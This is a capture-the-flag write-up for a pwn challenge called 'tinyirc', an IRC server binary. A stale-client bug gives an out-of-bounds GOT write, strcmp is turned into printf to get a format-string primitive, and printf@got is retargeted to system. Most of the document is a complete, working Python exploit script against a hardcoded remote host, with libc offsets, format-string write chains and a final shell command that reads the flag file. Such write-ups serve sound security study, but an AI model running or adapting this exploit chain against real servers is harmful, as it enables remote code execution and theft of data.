# pwn/tinyirc

## Overview

This challenge is a networked IRC server. 

Reversing the provided binary gives a two-stage attack:

1. Use a disconnect/reconnect bug to get an out-of-bounds write over the `.got/.bss` region.
2. Use that write to turn `strcmp()` into `printf()`, which converts command parsing into a format-string primitive.
3. Use the format string to retarget `printf@got` to `system`.
4. Send a shell command that prints the flag.

## Exploit Chain


### 1. Reverse the client layout and the bug

From disassembly:

- The global client array starts at `0x406120`.
- Each client entry is `0x1070` bytes.
- The input buffer is at `client + 0x67`.
- The input length field is at `client + 0x1068`.

We can see the `0x1070` stride in loops over clients. The important functions are:

- `disconnect()` at `0x401911`
- `recv_handler()` at `0x402866`

which the following are found:

1. `disconnect()` closes the socket and then zeroes the whole client structure with `memset(..., 0, 0x1070)`.
2. `recv_handler()` keeps using a stale pointer to that client entry after the disconnect path.
3. Later in `recv_handler()`, it computes the remaining buffered bytes and does a `memmove(client->buf, current_ptr, remaining)`.

If we can make the buffered length negative before that `memmove`, the next receive can write before `client->buf`, which is how we reach `.got` and the nearby globals.

### 2. Turn the stale-client bug into a controlled write

We start by opening two IRC connections to the announced ephemeral port. Call them `sock0` and `sock1`.

We use `sock1` to take the disconnect path in a way that leaves a stale client pointer behind:

```text
QUIT :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n
```

This is `QUIT :` followed by `103` `A` bytes.

After sending that line, we close `sock1` and reconnect immediately. The reconnect is important because the server reuses the freed client slot. On this new connection we send:

```python
slot1_hdr = struct.pack("<I", 5) + bytes([1, 0, 0]) + b"\x00" * 96
payload = struct.pack("<Q", (1 << 64) - 0x10F) + slot1_hdr
```

At this point the stale state from the old connection and the reused slot from the new connection combine into the primitive we want: `sock0` now carries a negative buffered-length value. The next receive into `sock0` is therefore treated as if it should be appended before the real start of `sock0`'s input buffer.

The input buffer for client 0 starts at:

```text
0x406120 + 0x67 = 0x406187
```

The corrupted buffered length is `-0x10f`, so the next write through `sock0` starts at:

```text
0x406187 - 0x10f = 0x406078
```

That gives us a controlled write that begins exactly in the GOT / global region.

### 3. Use the OOB write to create the format-string primitive

The next payload we send on `sock0` starts exactly at `0x406078`, so we use it to rewrite the GOT entry at that address. The first two words in the synthetic image are:

- `strcmp@got` at `0x406078` -> `0x4012c0` (`printf@plt.sec`)
- `fprintf@got` at `0x406080` -> `0x4012a0` (`send@plt.sec`)

The image also restores the nearby GOT words, the `stderr` copy relocation, and the beginning of client slot 0 so the server keeps running after the overwrite.

From this point on, command parsing no longer calls `strcmp(command, "NICK")`, `strcmp(command, "USER")`, and so on. It calls `printf(command, "NICK")`, `printf(command, "USER")`, and so on. That turns every command we send into a format string and gives us the primitive we need for the rest of the exploit.

### 4. Stabilize the format-string output and read one repeatable argument table

Once command parsing has been turned into `printf`, every line we send can be printed multiple times because the same command string is checked against several command names. That means stale output can overlap with the current probe if we use the same marker every time.

To avoid that, each `%p` probe uses a unique token:

```text
S00042%427$pE00042
```

The script then waits for exactly `S00042 ... E00042`. With unique tokens, every read is tied to the current probe only.

Before trusting any `%p` output, we also warm up the same path with:

```python
for i in range(420, 541):
    query(...)
```

This matters because we want the same broken `printf` path to run repeatedly until the argument layout settles down. After the warmup, the same positions become repeatable across reads in the same process.

At that point we can take a stable table and start using it for two goals at once:

1. recover a libc pointer so we can compute `system`
2. recover a stack pointer path so we can turn some arguments into GOT pointers

### 5. Recover libc base and a writable path through the argument table

The first value we need is the libc base. The challenge Dockerfile pins the exact Ubuntu 24.04 base image, so we can match the remote libc locally and recover the real `system` offset:

```text
system = 0x58740
```

From the warmed-up remote table, the useful libc leak is position `427`. Subtracting `0x60d78` from that leak gives a page-aligned base on the real service:

```python
libc_base = leak_427 - 0x60d78
system_addr = libc_base + 0x58740
```

That gives us the value we want to write at the end: `system_addr`.

The second value we need is a foothold into the argument table itself. We get that by actively probing the stack-looking arguments with one-byte writes. The important probe is position `478`. When `%478$hhn` is used and the nearby table is read again, the value at argument `504` changes. That tells us that argument `478` points to the memory cell that stores argument `504`.

So:

```text
478 -> slot 504
```

The value leaked by `%478$p` is therefore the address of stack slot `504`. Because amd64 argument slots are eight bytes apart, we can now compute the address of any nearby slot:

```python
slot_addr(pos) = slot504 + 8 * (pos - 504)
```

That is the first step in turning the argument table into something we can steer.

The next step is to extend that foothold into a reusable write head. The key observation from the same table is that argument `504` behaves as a pointer to slot `664`. That gives:

```text
504 -> slot 664
```

Now we have a complete stack write chain:

```text
478 -> slot 504
504 -> slot 664
```

We use it like this:

1. Leak `%478$p` to learn the address of slot `504`
2. Compute the address of any target slot with `slot_addr(pos)`
3. Write the low 16 bits of that target slot address through `%504$hn`
4. That retargets argument `664`
5. Use `%664$hn` to write through the newly retargeted argument

At this point we know both things we need for the final patch:

- the address of `system`
- a reliable way to retarget one argument so it writes to another chosen argument slot

### 7. Turn two existing arguments into `printf@got` pointers

The last remaining problem is choosing which arguments to convert into pointers to `printf@got`.

We want argument values that already look like:

```text
0x000000000040xxxx
```

because then a low-16-bit write is enough to turn them into:

```text
0x0000000000406060
0x0000000000406062
```

Those are:

- `printf@got`
- `printf@got + 2`

The stable pair on the remote service is:

- argument `476`, which holds `0x405e00`
- argument `438`, which holds `0x4044c7`

They are used in sequence.

First we convert argument `476` into `0x406060`:

1. compute `slot_addr(476)`
2. use `%504$hn` to point argument `664` at slot `476`
3. use `%664$hn` to write `0x6060`

Now argument `476` is a pointer to `printf@got`.

Then we convert argument `438` into `0x406062`:

1. compute `slot_addr(438)`
2. use `%504$hn` to point argument `664` at slot `438`
3. use `%664$hn` to write `0x6062`

Now argument `438` is a pointer to `printf@got + 2`.

The exploit verifies both of these before continuing:

```text
%476$p == 0x406060
%438$p == 0x406062
```

At that point the format string has become a direct two-slot writer into `printf@got`.

### 8. Patch `printf@got` to `system` and trigger the flag command

With `476` pointing to `printf@got` and `438` pointing to `printf@got + 2`, we only need to write the low 32 bits of `system`.

For this libc, `printf` and `system` are inside the same mapped region, so the upper bits do not need to be changed. The final format string therefore writes only:

- `(system_addr & 0xffff)` through argument `476`
- `((system_addr >> 16) & 0xffff)` through argument `438`

After those two `%hn` writes, `printf@got` resolves to `system`.

The next command we send is then executed by the shell. The reliable remote trigger is:

```text
cat</home/ctf/flag>&2
```

This version is used because stderr is guaranteed to reach the bootstrap socket through xinetd. Once that command runs, the flag comes back on the original connection to port `20998`.

## Final Solve

```python
#!/usr/bin/env python3
import itertools
import re
import socket
import struct
import time


HOST = "15.165.70.236"
BOOT_PORT = 20998

LIBC_OFF_427 = 0x60D78
SYSTEM_OFF = 0x58740
FLAG_RE = re.compile(r"codegate2026\{[^}\n]+\}")


def recv_some(sock, timeout=0.2):
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            data = sock.recv(65536)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def recv_until_match(sock, regex, timeout=8.0):
    end = time.time() + timeout
    buf = b""
    while time.time() < end:
        try:
            sock.settimeout(max(0.05, end - time.time()))
            data = sock.recv(65536)
        except socket.timeout:
            continue
        if not data:
            break
        buf += data
        m = regex.search(buf.decode("latin1", "ignore"))
        if m:
            return m, buf
    raise RuntimeError(f"timed out waiting for {regex.pattern!r}, buffer={buf[:400]!r}")


def recv_until_token(sock, start, end, timeout=3.0):
    end_t = time.time() + timeout
    buf = b""
    while time.time() < end_t:
        try:
            sock.settimeout(max(0.05, end_t - time.time()))
            data = sock.recv(65536)
        except socket.timeout:
            continue
        if not data:
            break
        buf += data
        i = buf.find(start)
        if i != -1:
            j = buf.find(end, i + len(start))
            if j != -1:
                return buf[i + len(start):j]
    raise RuntimeError(f"timed out waiting for token {start!r}..{end!r}, buffer={buf[:300]!r}")


def connect_irc(port, tries=30):
    last = None
    for _ in range(tries):
        try:
            s = socket.create_connection((HOST, port), timeout=1.2)
            recv_some(s, 0.05)
            return s
        except Exception as e:
            last = e
            time.sleep(0.12)
    raise last


def sendline(sock, data):
    sock.sendall(data + b"\n")


def stage1_patch(sock0, sock1, ephemeral_port):
    sock1.sendall(b"QUIT :" + b"A" * 103 + b"\r\n")
    time.sleep(0.08)
    sock1.close()

    sock1b = connect_irc(ephemeral_port)
    n = 0x10F
    slot1_hdr = struct.pack("<I", 5) + bytes([1, 0, 0]) + b"\x00" * 96
    sock1b.sendall(struct.pack("<Q", (1 << 64) - n) + slot1_hdr)
    time.sleep(0.04)

    img = bytearray(0x10F)
    img[0:8] = struct.pack("<Q", 0x4012C0)
    img[8:16] = struct.pack("<Q", 0x4012A0)
    vals = [
        0x401144, 0x401154, 0x401164, 0x401174, 0x401184, 0x401194,
        0x4011A4, 0x4011B4, 0x4011C4, 0x4011D4, 0x4011E4, 0x4011F4,
    ]
    for i, v in enumerate(vals, start=2):
        img[i * 8:i * 8 + 8] = struct.pack("<Q", v)
    stderr_off = 0x406100 - 0x406078
    img[stderr_off:stderr_off + 8] = struct.pack("<Q", 4)
    base = 0x406120 - 0x406078
    img[base:base + 4] = struct.pack("<I", 4)
    img[base + 4] = 1
    sock0.sendall(bytes(img))
    time.sleep(0.04)
    return sock1b


def query(sock0, boot, counter, pos, timeout=2.0):
    n = next(counter)
    start = f"S{n:05x}".encode()
    end = f"E{n:05x}".encode()
    recv_some(boot, 0.02)
    sendline(sock0, start + f"%{pos}$p".encode() + end)
    data = recv_until_token(boot, start, end, timeout=timeout)
    recv_some(boot, 0.02)
    return data.decode("latin1", "ignore")


def write_hn(sock0, boot, pos, value, wait=0.8):
    recv_some(boot, 0.05)
    sendline(sock0, f"%1${value}c%{pos}$hn".encode())
    time.sleep(wait)
    recv_some(boot, 0.5)


def write_payload(sock0, boot, payload, wait=0.9):
    recv_some(boot, 0.05)
    sendline(sock0, payload)
    time.sleep(wait)
    recv_some(boot, 0.5)


def attempt():
    counter = itertools.count(1)
    boot = s0 = s1 = None
    try:
        boot = socket.create_connection((HOST, BOOT_PORT), timeout=5)
        m, _ = recv_until_match(boot, re.compile(r"tinyIRC server listening on port (\d+)"))
        ephemeral_port = int(m.group(1))
        print(f"[+] ephemeral port: {ephemeral_port}", flush=True)

        s0 = connect_irc(ephemeral_port)
        s1 = connect_irc(ephemeral_port)
        s1 = stage1_patch(s0, s1, ephemeral_port)
        recv_some(boot, 0.1)

        for i in range(420, 541):
            query(s0, boot, counter, i, timeout=1.2)

        libc_leak = int(query(s0, boot, counter, 427), 16)
        libc_base = libc_leak - LIBC_OFF_427
        if libc_base & 0xFFF:
            raise RuntimeError(f"bad libc base {hex(libc_base)} from leak {hex(libc_leak)}")
        system_addr = libc_base + SYSTEM_OFF

        slot504 = int(query(s0, boot, counter, 478), 16)
        print(f"[+] libc_base={hex(libc_base)} system={hex(system_addr)} slot504={hex(slot504)}", flush=True)

        def slot_addr(pos):
            return slot504 + 8 * (pos - 504)

        for slot_pos, got_low in [(476, 0x6060), (438, 0x6062)]:
            write_hn(s0, boot, 504, slot_addr(slot_pos) & 0xFFFF)
            write_hn(s0, boot, 664, got_low)

        q476 = query(s0, boot, counter, 476)
        q438 = query(s0, boot, counter, 438)
        if q476 != "0x406060" or q438 != "0x406062":
            raise RuntimeError(f"staging mismatch: 476={q476} 438={q438}")

        chunks = [
            (system_addr & 0xFFFF, 476),
            ((system_addr >> 16) & 0xFFFF, 438),
        ]
        chunks.sort()
        parts = []
        count = 0
        for value, pos in chunks:
            delta = (value - count) & 0xFFFF
            if delta:
                parts.append(f"%1${delta}c")
                count = (count + delta) & 0xFFFF
            parts.append(f"%{pos}$hn")
        final_fmt = "".join(parts).encode()
        write_payload(s0, boot, final_fmt)

        sendline(s0, b"cat</home/ctf/flag>&2")
        m, _ = recv_until_match(boot, FLAG_RE, timeout=10.0)
        return m.group(0)
    finally:
        for sock in (s0, s1, boot):
            try:
                if sock is not None:
                    sock.close()
            except Exception:
                pass


def main():
    for attempt_no in range(1, 16):
        try:
            print(f"[*] attempt {attempt_no}", flush=True)
            flag = attempt()
            print(flag, flush=True)
            return
        except Exception as e:
            print(f"[!] attempt {attempt_no} failed: {e}", flush=True)
            time.sleep(0.5)
    raise SystemExit("failed to retrieve flag after 15 attempts")


if __name__ == "__main__":
    main()
```

Run it with:

```bash
python3 solve.py
```